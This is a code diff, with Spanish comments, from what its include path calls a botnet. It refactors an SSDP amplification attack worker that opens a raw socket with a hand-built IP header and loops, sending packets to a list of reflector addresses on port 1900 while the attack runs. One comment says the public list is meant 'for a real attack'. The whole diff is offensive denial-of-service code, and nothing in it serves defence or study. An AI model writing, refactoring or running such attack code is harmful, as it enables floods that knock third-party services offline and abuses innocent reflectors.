@@ -1,13 +1,16 @@
 #include "../../../include/botnet.h"
 #include "../../../include/compat/raw_structs.h" // ¡LA SOLUCIÓN DEFINITIVA!
 
-// Lista de reflectores públicos para un ataque real
-const char *ssdp_reflectors[] = {"198.51.100.1", "203.0.113.5", "192.0.2.10"};
-int num_ssdp_reflectors = sizeof(ssdp_reflectors) / sizeof(char *);
+// Estructura para gestionar los reflectores de forma más limpia
+typedef struct {
+    const char **list;
+    int count;
+} reflector_list_t;
 
-// En modo de prueba local, usaremos nuestro propio reflector falso
+// Listas de reflectores
+static const char *ssdp_reflectors_public[] = {"198.51.100.1", "203.0.113.5", "192.0.2.10"};
 #ifdef LOCAL_TEST
-const char *local_reflector[] = {"127.0.0.1"};
+static const char *ssdp_reflectors_local[] = {"127.0.0.1"};
 #endif
 
 // Prototipo de la función de checksum definida en otro lugar (dns_amp.c)
@@ -31,20 +34,21 @@ void *ssdp_amp_worker(void *args) {
     int one = 1;
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) { perror("setsockopt"); close(sock); return NULL; }
 
+    reflector_list_t reflectors;
 #ifdef LOCAL_TEST
-    const char **reflectors = local_reflector;
-    int num_reflectors = 1;
+    reflectors.list = ssdp_reflectors_local;
+    reflectors.count = sizeof(ssdp_reflectors_local) / sizeof(char *);
 #else
-    const char **reflectors = ssdp_reflectors;
-    int num_reflectors = num_ssdp_reflectors;
+    reflectors.list = ssdp_reflectors_public;
+    reflectors.count = sizeof(ssdp_reflectors_public) / sizeof(char *);
 #endif
 
     struct sockaddr_in sin;
     while (attack_running) {
-        for (int j = 0; j < num_reflectors; j++) {
+        for (int j = 0; j < reflectors.count; j++) {
             sin.sin_family = AF_INET;
             sin.sin_port = htons(1900);
-            sin.sin_addr.s_addr = inet_addr(reflectors[j]);
+            sin.sin_addr.s_addr = inet_addr(reflectors.list[j]);
 
             memset(datagram, 0, 4096);
 
